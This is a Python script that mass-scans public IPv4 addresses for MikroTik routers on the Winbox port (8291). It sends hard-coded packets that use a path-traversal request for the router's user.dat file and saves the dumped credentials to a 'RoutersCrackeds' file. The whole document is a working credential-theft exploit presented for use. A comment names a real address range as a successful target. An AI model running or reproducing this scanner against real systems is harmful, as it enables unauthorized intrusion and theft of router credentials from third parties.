# Mikrotik Scanner Ports Exploit #

import ipaddress
import socket
from extract_user import dump	
from ipaddress import *

# Vars #
a = [0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
     0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
     0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
     0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
     0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
     0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
     0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
     0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
     0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
     0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
     0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
     0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
     0x00, 0x00]

b = [0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
     0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
     0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
     0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
     0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
     0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
     0x00, 0x02, 0x00, 0x00, 0x00]

# Vars #
# Exploit sucess example: "41.79.11.122" - "41.79.11.0/24".
#ip = ip_network('1.0.0.0/1')
ip = IPv4Address("200.0.0.0")
ip_final = IPv4Address("255.255.255.255")
port_default = 8291

# Start program #
if __name__ == "__main__":

	# File Saving #
	f = open("MikrotikScanner_RoutersCrackeds.txt", "w")

	#for ip in ip.hosts():
	while ip < ip_final:

		# IP Internals #
		if (ip == ip_network("10.0.0.0/24")) or (ip == ip_network("192.168.0.0/24")) or (ip == ip_network("172.17.0.0/24")):
			print("IP Internal!")
			break

		# Sockets #
		try:
			s_test_port = socket.socket()
			s_test_port.settimeout(0.5)
		except Exception as error:
			print("Socket Error: {0}".format(error))

		# Verify Mikrotik Open Port #
		code_test_port = s_test_port.connect_ex((str(ip), port_default))

		# IP #
		print("=-"*30)
		print("IP: {0}".format(str(ip)))

		if (code_test_port == 0):
				
			print("Porta {0} ABERTA!".format(port_default))

			s = socket.socket()
			s.settimeout(0.5)

			while s != 0:
				
				# File Saving #
				f = open("MikrotikScanner_RoutersCrackeds.txt", "a")
				#f.write("Woops! I have deleted the content!")
				#f.close()

				try:
					s.connect((str(ip), port_default)) 
				except Exception as error:
					print("Connection Error: {0}".format(str(error)))
					s.close()
					break

				#Convert to bytearray for manipulation
				a = bytearray(a)
				b = bytearray(b)

				#Send hello and recieve the sesison id
				s.send(a) 
				try:	
					d = bytearray(s.recv(1024))
				except Exception as error:
					print("Connection Error: {0}".format(str(error)))
					s.close()
					break

				try:	
					#Replace the session id in template
					b[19] = d[38]

					#Send the edited response
					s.send(b)
					d = bytearray(s.recv(1024))
				except Exception as error:
					print("Connection Error: {0}".format(str(error)))
					s.close()
					break
				#Get results
				print("Connected to " + str(ip) + ":" + str(port_default))
				if len(d[55:]) > 25:
					print("Exploit successful")
					dump(d[55:])
					# File Saving #
					f.write("=-"*30)
					f.write("\n[ EXPLOIT SUCCESSFUL ]\n")
					f.write("IP: {0}".format(str(ip)))
					f.write(dump(d[55:]))
					f.write("=-"*30)
					f.write("\n")
					s.close()
					break
				else:
					print("Exploit Failed!")
					s.close()
					break
				f.close()
		else:
			print("Porta {0} FECHADA!".format(port_default))
		# Close #
		s_test_port.close()
		# IP Next #
		ip += 1